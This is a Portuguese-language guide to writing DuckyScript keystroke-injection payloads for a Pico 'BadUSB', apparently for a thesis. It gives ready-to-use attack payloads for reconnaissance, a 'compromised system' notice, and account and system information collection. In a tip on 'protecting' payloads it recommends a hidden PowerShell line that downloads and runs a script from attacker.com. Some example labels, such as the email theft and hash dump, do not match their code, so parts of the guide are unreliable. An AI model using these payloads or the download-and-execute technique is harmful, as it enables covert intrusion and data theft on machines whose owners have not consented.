# Guia de Criação de Payloads DuckyScript

Crie seus próprios ataques de keystroke injection com DuckyScript.

## Conceitos Básicos

Um payload é um arquivo de texto (`.dd`) que contém uma sequência de comandos que o Pico executa como se você tivesse digitando no teclado.

**Fluxo típico:**
```
1. Usuário pluga Pico na máquina
2. Pico é reconhecido como teclado USB
3. Pico começa a "digitar" comandos automaticamente
4. Pode abrir apps, executar comandos, roubar dados, etc.
```

## Sintaxe de Comandos

### STRING - Digita Texto

```
STRING hello world
```

Digita literalmente: `hello world`

**Exemplo completo:**
```
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING Hacked by Pico Ducky!
```

### DELAY - Aguarda Tempo

```
DELAY 1000
```

Aguarda **1000 milissegundos** (1 segundo).

**Por que usar DELAY?**
- Apps podem levar tempo pra abrir (CMD, PowerShell, etc)
- Rede lenta
- Máquina ocupada
- Segurança contra timeouts

**Dica:** Sempre coloque `DELAY` antes de comandos críticos!

### Teclas Especiais

| Comando | Tecla |
|---------|-------|
| ENTER | Enter/Return |
| SPACE | Espaço |
| TAB | Tabulação |
| BACKSPACE | Backspace |
| DELETE | Delete |
| ESCAPE | Escape |
| HOME | Home |
| END | End |
| UP | Seta pra cima |
| DOWN | Seta pra baixo |
| LEFT | Seta pra esquerda |
| RIGHT | Seta pra direita |

**Exemplo:**
```
STRING opa
BACKSPACE       # deleta o 'a'
BACKSPACE       # deleta o 'p'
STRING teste
ENTER
```

### Modificadores (Ctrl, Alt, Shift, Windows/GUI)

Combinação de teclas:

```
CTRL a           # Ctrl+A (seleciona tudo)
CTRL c           # Ctrl+C (copia)
CTRL v           # Ctrl+V (cola)
GUI r            # Windows+R (Executar)
GUI d            # Windows+D (mostra desktop)
ALT TAB          # Alt+Tab (troca janela)
ALT F4           # Alt+F4 (fecha)
SHIFT TAB        # Shift+Tab
```

**Exemplo - Copy/Paste:**
```
CTRL a           # Seleciona tudo
DELAY 100
CTRL c           # Copia
DELAY 100
```

## Exemplos Práticos

### Exemplo 1: Abrir Calculadora (Windows)

```
# Payload: Abre Calculadora
# Teste em: Windows 7+

DELAY 1000         # Aguarda o sistema estar pronto

GUI r              # Abre Executar (Windows+R)
DELAY 500

STRING calc        # Digita "calc"
ENTER              # Pressiona Enter
DELAY 1000

# Agora a calculadora está aberta
STRING 2+2
ENTER
```

**Resultado esperado:** Calculadora abre e calcula 2+2.

---

### Exemplo 2: Robo de Email (PowerShell)

```
# Payload: Tira screenshot e envia pro Pastebin
# Requer PowerShell e conexão internet

DELAY 2000
GUI r
DELAY 500

STRING powershell
ENTER
DELAY 1500

# Navega até a pasta de documentos
STRING cd $env:USERPROFILE\Documents
ENTER
DELAY 500

# Cria um arquivo com informações da máquina
STRING "Máquina: $(hostname)" > info.txt
ENTER
DELAY 500

# Addi o usuário
STRING "Usuário: $env:USERNAME" >> info.txt
ENTER
DELAY 500

# Abre o arquivo criado
STRING notepad info.txt
ENTER
```

---

### Exemplo 3: Defacement (Windows Notepad)

```
# Payload: Abre Bloco de Notas e escreve mensagem

DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1500

# Escreve uma mensagem de "hacked"
STRING ╔═══════════════════════════╗
ENTER
STRING ║  SISTEMA COMPROMETIDO     ║
ENTER
STRING ║  Hora: 
ENTER
STRING ║  Dispositivo: BadUSB Pico ║
ENTER
STRING ╚═══════════════════════════╝

# Salva o arquivo
CTRL s
DELAY 500
STRING hacked.txt
ENTER
DELAY 500
```

---

### Exemplo 4: Extração de Senhas (Windows)

```
# Payload: Extrai hashes de senha do sistema (requer admin)
# USE APENAS EM MÁQUINAS QUE VOCÊ CONTROLA!

DELAY 2000
GUI r
DELAY 500

STRING powershell -NoP -W Hidden -C
ENTER
DELAY 1000

# Comando pra extrair hashes (sam dump)
STRING Get-WmiObject -Class Win32_UserAccount | Select-Object -Property Name, FullName | Out-File hash_dump.txt
ENTER
DELAY 2000

# Abrir arquivo
STRING notepad hash_dump.txt
ENTER
```

---

### Exemplo 5: Spyware Simples (macOS)

```
# Payload: Extrai informações do sistema macOS

DELAY 2000

# Abre Terminal
STRING cmd + space
DELAY 1000

STRING terminal
ENTER
DELAY 1500

# Lista usuários
STRING ls /Users/
ENTER
DELAY 1000

# Info do sistema
STRING system_profiler SPHardwareDataType
ENTER
DELAY 2000

# IP da máquina
STRING ifconfig | grep inet
ENTER
DELAY 1000
```

---

## Boas Práticas

### 1. Sempre comece com DELAY

A máquina pode estar lenta, então deixe tempo pra estar pronta:

```
DELAY 2000   # 2 segundos pra ter certeza
```

### 2. Teste em uma máquina descartável

**Nunca** execute payload desconhecido em máquina importante. Use VM ou máquina de teste.

### 3. Adicione comentários

Use `#` no início da linha pra fazer comentários:

```
# Este é um comentário
STRING hello  # Isso vai ignorar o "# Isso vai..."? NÃO
# Use comentários em linhas separadas
```

### 4. Evite erros de digitação

Ao usar `STRING`, qualquer caractere especial (` / \ @ # $ % ^ & * ( ) - _ = + [ ] { } ; : ' " < > , . ?`) pode não sair certo se o layout do teclado for diferente.

**Layout ABNT2 (português) vs US causam problemas:**
- `@` em US = Shift+' em ABNT2
- `/` em US = Shift+7 em ABNT2
- Solução: use keycodes diretos ou ajuste o layout em `payloads.py`

### 5. Teste incrementalmente

Não faça payload gigante de uma vez. Teste parte por parte:

```
# Teste 1: Apenas abrir notepad
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER

# Depois disso funcionar, adicione mais...
DELAY 1000
STRING teste
```

### 6. Proteja seu código

Se o payload roubar dados, **não deixe em código claro**:

```
# Ruim:
STRING Send password to attacker@evil.com

# Melhor:
STRING powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
```

### 7. Sempre deixe claro que é educacional

Na banca, deixe explícito:

```
# ========================================
# PAYLOAD DE DEMONSTRAÇÃO - USO EDUCACIONAL
# TCC: Hardware Hacking
# Máquina: Sistema Controlado de Laboratório
# Autorização: Explícita
# ========================================

DELAY 2000
# ... resto do payload
```

## Referência Completa de Keycodes

| Keycode | Descrição |
|---------|-----------|
| A-Z | Letras (exemplo: A, B, C) |
| 0-9 | Números |
| SPACE | Espaço |
| ! | Exclamação (Shift+1 em US) |
| @ | Arroba (Shift+2 em US) |
| # | Hashtag (Shift+3 em US) |
| $ | Cifrão (Shift+4 em US) |
| % | Porcento (Shift+5 em US) |
| ^ | Acento circunflexo (Shift+6 em US) |
| & | E comercial (Shift+7 em US) |
| * | Asterisco (Shift+8 em US) |
| ( | Parêntese esquerdo (Shift+9 em US) |
| ) | Parêntese direito (Shift+0 em US) |

## Conversor de Payload

Se quiser converter um script de outro formato (tipo `.txt` do Ducky original), basta:

1. Renomear pra `.dd`
2. Copiar pra pasta `/payloads`
3. Pico detecta automaticamente

Exemplo de conversão:
```
# Rubber Ducky format (original)
DELAY 1000
REM Comment here
GUI r
...

# Para Pico (remove REM):
DELAY 1000
# Comment here
GUI r
...
```

---

## Teste Online

Você pode simular DuckyScript em: https://duckypad.xyz/

(Não funciona com Pico Ducky, mas ajuda a debugar sintaxe)

---

**Pronto pra criar payloads? Comece simples, teste bem, e boa sorte! 🚀**
